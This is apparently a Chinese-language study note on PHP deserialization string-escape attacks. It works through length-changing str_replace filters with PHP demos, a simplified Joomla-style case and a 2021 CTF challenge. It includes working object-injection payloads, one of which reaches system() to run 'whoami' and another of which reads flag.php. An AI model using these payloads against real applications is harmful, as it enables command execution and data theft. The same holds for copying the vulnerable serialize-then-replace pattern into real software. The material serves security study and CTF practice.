## 反序列化字符串逃逸

```php
<?php 
class Demo{
    public $a="asdf";
}
$test=new Demo();
echo serialize($test)."\n";
?>
```

`O:4:"Demo":1:{s:1:"a";s:4:"asdf";}`

```php
<?php 
class Demo{
    public $a="asdf";
}
$str='O:4:"Demo":1:{s:1:"a";s:4:"asdf";}123456';
var_dump(unserialize($str));
?>
```

```
object(Demo)#1 (1) {
  ["a"]=>
  string(4) "asdf"
}
```

反序列化的过程是`{`最近的`;}`完成匹配并停止解析,在序列化结果的结尾加上无意义字符串仍然能够进行反序列化

### 字符串变长

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors','1');
$username="axxx";
$password="123456";
$user=array($username,$password);

echo serialize($user)."<br>";
$re=str_replace('x','yy',serialize($user));
echo $re."<br>";
unserialize($re);
?>
```

```
a:2:{i:0;s:4:"axxx";i:1;s:6:"123456";}
a:2:{i:0;s:4:"ayyyyyy";i:1;s:6:"123456";}

Notice: unserialize(): Error at offset 18 of 41 bytes in /var/www/html/test.php on line 11
```

要做到在`str_replace`后仍然能够正常进行反序列化,并修改密码

`";i:1;s:6:"123456";}`的长度为20,`20+len=2*len`,`len=20`,因此`x`共有20个

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors','1');
$username='axxxxxxxxxxxxxxxxxxxx";i:1;s:6:"654321";}';
$password="123456";
$user=array($username,$password);

echo serialize($user)."<br>";
$re=str_replace('x','yy',serialize($user));
echo $re."<br>";
var_dump(unserialize($re));
?>
```

```
a:2:{i:0;s:41:"axxxxxxxxxxxxxxxxxxxx";i:1;s:6:"654321";}";i:1;s:6:"123456";}
a:2:{i:0;s:41:"ayyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";i:1;s:6:"654321";}";i:1;s:6:"123456";}
array(2) { [0]=> string(41) "ayyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy" [1]=> string(6) "654321" } 
```

### 字符串变短

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors','1');
$demo=array();
$demo["name"]='adminadminadminadmin';
$demo["info"]='a";s:4:"info";s:10:"gululingbo";s:6:"secret";s:7:"7654321";}';
$demo["secret"]='123456';
print_r($demo);
echo "<br>".serialize($demo)."<br>";
$re=str_replace('admin','',serialize($demo));
echo $re."<br>";
var_dump(unserialize($re));
?>
```

```
Array ( [name] => adminadminadminadmin [info] => a";s:4:"info";s:10:"gululingbo";s:6:"secret";s:7:"7654321";} [secret] => 123456 )
a:3:{s:4:"name";s:20:"adminadminadminadmin";s:4:"info";s:60:"a";s:4:"info";s:10:"gululingbo";s:6:"secret";s:7:"7654321";}";s:6:"secret";s:6:"123456";}
a:3:{s:4:"name";s:20:"";s:4:"info";s:60:"a";s:4:"info";s:10:"gululingbo";s:6:"secret";s:7:"7654321";}";s:6:"secret";s:6:"123456";}
array(3) { ["name"]=> string(20) "";s:4:"info";s:60:"a" ["info"]=> string(10) "gululingbo" ["secret"]=> string(7) "7654321" } 
```

当把admin替换之后,`s:20`仍然需要20个字符,为了满足反序列化的要求,会向后读取字符,直至凑齐20个字符,也就是读取`";s:4:"info";s:60:"a`,凑齐20个字符后恰好以`";`结尾

后面的`s:4:"info";s:10:"gululingbo";s:6:"secret";s:7:"7654321";`正常进行反序列化,然后遇到`}`且对象数量已经满足,因此反序列化正常结束

### 例题

#### Joomla反序列化逃逸

[简易版的Joomla处理反序列化的机制](https://xz.aliyun.com/t/6718/#toc-1)

```php
<?php

class evil
{
    public $cmd;

    public function __construct($cmd)
    {
        $this->cmd = $cmd;
    }

    public function __destruct()
    {
        system($this->cmd);
    }
}

class User
{
    public $username;
    public $password;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }

}

function write($data)
{
    $data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
    file_put_contents("/tmp/dbs.txt", $data);
}

function read()
{
    $data = file_get_contents("/tmp/dbs.txt");
    $data = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
    return $data;
}

if (file_exists("/tmp/dbs.txt")) {
    unlink("/tmp/dbs.txt");
}

$username = '\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0';
$password = 'a";s:8:"password";O:4:"evil":1:{s:3:"cmd";s:6:"whoami";}';

write(serialize(new User($username, $password)));
var_dump(unserialize(read()));
```

```
www-data
boolean false
```

注意`'\0\0\0'`与`"\0\0\0"`的区别,在`read`函数中将`\0\0\0`(六个字符)替换为`chr(0).'*'.chr(0)`(三个字符),由于字符串发生变短,此处产生了字符串逃逸,利用逃逸的字符串对`evil`进行反序列化并进行命令执行

#### 2021年新生赛easy-unserialize

[xp0int-2021-ctf-web/easy-unserialize](https://github.com/mi3aka/xp0int-2021-ctf-web/tree/master/easy-unserialize)

```php
<?php
highlight_file(__FILE__);

class getflag
{
    public $file;

    public function __destruct()
    {
        if ($this->file === "flag.php") {
            echo file_get_contents($this->file);
        }
    }
}

class tmp
{
    public $str1;
    public $str2;

    public function __construct($str1, $str2)
    {
        $this->str1 = $str1;
        $this->str2 = $str2;
    }
}

$str1 = $_POST['str1'];
$str2 = $_POST['str2'];
$data = serialize(new tmp($str1, $str2));
$data = str_replace("easy", "ez", $data);
unserialize($data);
```

```php
<?php
highlight_file(__FILE__);

class getflag
{
    public $file;

    public function __destruct()
    {
        if ($this->file === "flag.php") {
            echo file_get_contents($this->file);
        }
    }
}

class tmp
{
    public $str1;
    public $str2;

    public function __construct($str1, $str2)
    {
        $this->str1 = $str1;
        $this->str2 = $str2;
    }

}

$str1 = 'easyeasyeasyeasyeasyeasyeasyeasyeasy';
$str2 = ';s:4:"str2";O:7:"getflag":1:{s:4:"file";s:8:"flag.php";}';
$data = serialize(new tmp($str1, $str2));
$data = str_replace("easy", "ez", $data);
unserialize($data);
```

利用`easy`缩短成`ez`产生的长度差,将`getflag`的反序列化逃逸出去